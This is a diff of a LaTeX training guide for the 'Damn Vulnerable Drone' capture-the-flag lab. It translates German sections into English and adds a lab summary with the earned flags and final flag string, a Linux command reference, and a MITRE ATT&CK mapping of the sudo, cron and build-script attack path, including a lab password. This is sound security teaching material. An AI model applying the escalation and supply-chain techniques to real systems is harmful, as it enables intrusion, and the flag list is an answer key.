-nmap -sS -O 172.20.0.3
-\end{lstlisting}
+Consider pursuing these entry-level certifications:
+\begin{itemize}
+    \item CompTIA Security+ (foundational)
+    \item CEH (Certified Ethical Hacker)
+    \item GSEC (GIAC Security Essentials)
+    \item CySA+ (Cybersecurity Analyst)
+\end{itemize}
 
 \section{Troubleshooting}
 
-\subsection{Häufige Probleme}
+\subsection{Common Problems}
 
-\subsubsection{Cron-Service-Probleme}
-\begin{lstlisting}[language=bash, caption=Cron-Debugging]
-# Service-Status überprüfen
+\subsubsection{Cron Service Issues}
+\begin{lstlisting}[language=bash, caption=Cron Debugging]
+# Check service status
 sudo systemctl status cron
 
-# Service neu starten
+# Restart service
 sudo systemctl restart cron
 
-# Cron-Logs analysieren
+# Analyze cron logs
 sudo tail -f /var/log/syslog | grep CRON
 \end{lstlisting}
 
-\subsubsection{Netzwerkverbindungsprobleme}
-\begin{lstlisting}[language=bash, caption=Netzwerk-Debugging]
-# Container-Netzwerk überprüfen
+\subsubsection{Network Connection Problems}
+\begin{lstlisting}[language=bash, caption=Network Debugging]
+# Check container network
 docker network ls
 docker network inspect dvd_dvd-network
 
-# Container-Konnektivität testen
+# Test container connectivity
 docker exec dvd-developer-machine ping -c 3 ground-control
 \end{lstlisting}
 
-\subsubsection{Permission-Probleme}
-\begin{lstlisting}[language=bash, caption=Permission-Debugging]
-# Datei-Berechtigungen überprüfen
+\subsubsection{Permission Issues}
+\begin{lstlisting}[language=bash, caption=Permission Debugging]
+# Check file permissions
 ls -la /opt/build-update.sh
 sudo chmod +x /opt/build-update.sh
 
-# SELinux/AppArmor-Status (falls aktiviert)
+# SELinux/AppArmor status (if enabled)
 getenforce
 aa-status
 \end{lstlisting}
 
-\section{Fazit}
+\section{Lab Summary}
 
-Das Damn Vulnerable Drone CTF-Szenario bietet eine realistische Simulation eines Supply Chain Compromise, der die kritische Bedeutung von:
+\subsection{What You Accomplished}
 
+\begin{challengebox}{Your Achievement Summary}
+You successfully completed a realistic supply chain attack simulation:
+
+\textbf{Flags Earned:}
+\begin{enumerate}
+    \item CONNECTED\_TO\_LAB - First system access
+    \item FOUND\_DEVELOPER\_USER - System reconnaissance
+    \item BECAME\_DEVELOPER - Privilege escalation
+    \item FOUND\_BUILD\_SYSTEM\_CLUES - Intelligence gathering
+    \item FOUND\_BUILD\_SCRIPT - Target identification
+    \item FOUND\_SUDO\_PRIVILEGES - Vulnerability discovery
+    \item SUPPLY\_CHAIN\_COMPROMISED - Supply chain compromise
+    \item DVD\{supply\_ch41n\_c0mpr0m153\_1s\_r34l\_7hr347\} - Mission complete
+\end{enumerate}
+
+\textbf{Skills Demonstrated:}
 \begin{itemize}
-    \item Sicheren Entwicklungsumgebungen
-    \item Principle of Least Privilege
-    \item Kontinuierlichem Monitoring
-    \item Supply Chain Security
+    \item Linux command line proficiency
+    \item System reconnaissance techniques
+    \item Privilege escalation exploitation
+    \item Supply chain attack methodology
+    \item Build system manipulation
+    \item Security impact assessment
 \end{itemize}
 
-demonstriert. Die Challenge zeigt, wie scheinbar harmlose Berechtigungen (sudo crontab) zu einer vollständigen Kompromittierung kritischer Infrastruktur führen können.
+\noindent\rule{\linewidth}{0.4pt}\\[2em]
+\end{challengebox}
 
-\subsection{Weiterführende Ressourcen}
+\subsection{Final Thoughts}
+
+\begin{storybox}
+\textbf{Congratulations, Security Professional!}
+
+You've just completed your first professional-level cybersecurity exercise. The techniques you learned are used every day by:
+\begin{itemize}
+    \item Penetration testers securing corporate networks
+    \item Red teams testing government defenses
+    \item Security researchers discovering vulnerabilities
+    \item Incident responders investigating breaches
+\end{itemize}
+
+Remember: With great power comes great responsibility. Use these skills to make the digital world safer for everyone!
+
+Welcome to the cybersecurity community!
+\end{storybox}
+
+\section{Additional Resources}
+
+\subsection{Further Learning}
 
 \begin{itemize}
     \item MITRE ATT\&CK Framework: \url{https://attack.mitre.org/}
     \item NIST Cybersecurity Framework: \url{https://www.nist.gov/cyberframework}
-    \item OWASP Top 10 für Container: \url{https://owasp.org/www-project-container-top-10/}
+    \item OWASP Top 10 for Containers: \url{https://owasp.org/www-project-container-top-10/}
     \item MAVLink Protocol Documentation: \url{https://mavlink.io/}
 \end{itemize}
+
+\appendix
+
+\section{Command Reference}
+
+\subsection{Essential Linux Commands}
+
+\begin{longtable}{|l|p{8cm}|}
+\caption{Linux Commands Used in This Lab} \\
+\hline
+\textbf{Command} & \textbf{Description} \\
+\hline
+\endfirsthead
+\hline
+\textbf{Command} & \textbf{Description} \\
+\hline
+\endhead
+\hline
+\endfoot
+\hline
+\endlastfoot
+
+\texttt{pwd} & Print working directory (where am I?) \\
+\texttt{whoami} & Show current username \\
+\texttt{id} & Show user ID and groups \\
+\texttt{ls -la} & List files with detailed information \\
+\texttt{cat filename} & Display file contents \\
+\texttt{find / -name pattern} & Search for files \\
+\texttt{sudo -l} & List sudo privileges \\
+\texttt{crontab -l} & List cron jobs \\
+\texttt{ps aux} & List running processes \\
+\texttt{tail -f filename} & Follow file updates in real-time \\
+\texttt{chmod +x filename} & Make file executable \\
+\texttt{su - username} & Switch to different user \\
+\hline
+\end{longtable}
+
+\section{MITRE ATT\&CK Mapping}
+
+\subsection{Techniques Demonstrated}
+
+\begin{longtable}{|l|l|p{6cm}|}
+\caption{MITRE ATT\&CK Techniques in This Lab} \\
+\hline
+\textbf{ID} & \textbf{Technique} & \textbf{Lab Implementation} \\
+\hline
+\endfirsthead
+\hline
+\textbf{ID} & \textbf{Technique} & \textbf{Lab Implementation} \\
+\hline
+\endhead
+\hline
+\endfoot
+\hline
+\endlastfoot
+
+T1078 & Valid Accounts & Using developer credentials (dev123) \\
+T1083 & File and Directory Discovery & Exploring filesystem with ls, find \\
+T1053.003 & Scheduled Task/Job: Cron & Exploiting cron jobs for persistence \\
+T1548.003 & Abuse Elevation Control: Sudo & Exploiting sudo NOPASSWD misconfiguration \\
+T1195.002 & Supply Chain Compromise & Injecting malicious code into build system \\
+T1485 & Data Destruction & Simulating drone system compromise \\
+\hline
+\end{longtable}
 
 \end{document}
